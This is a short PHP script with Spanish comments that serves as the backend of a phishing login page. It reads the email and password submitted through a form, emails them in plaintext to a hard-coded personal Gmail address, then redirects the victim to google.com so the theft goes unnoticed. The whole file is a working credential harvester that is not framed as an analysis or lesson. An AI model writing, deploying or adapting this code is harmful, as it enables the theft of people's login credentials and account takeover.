<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Validar y procesar los datos según sea necesario

    // Enviar el correo electrónico
    $to = "lianpaulino2123@gmail.com";
    $subject = "Nuevo inicio de sesión";
    $message = "Se ha iniciado sesión en el sistema.\nCorreo electrónico: $email\nContraseña: $password";

    // Puedes ajustar las cabeceras según tus necesidades
    $headers = "From: webmaster@example.com";

    // Enviar el correo electrónico
    mail($to, $subject, $message, $headers);
    
    // Redirigir a Google después de enviar el correo
    header("Location: https://www.google.com");
    exit(); // Asegúrate de salir para evitar que el resto del script se ejecute
} else {
    // Redirigir si no es una solicitud POST (opcional)
    // header("Location: formulario_login.php");
}
?>
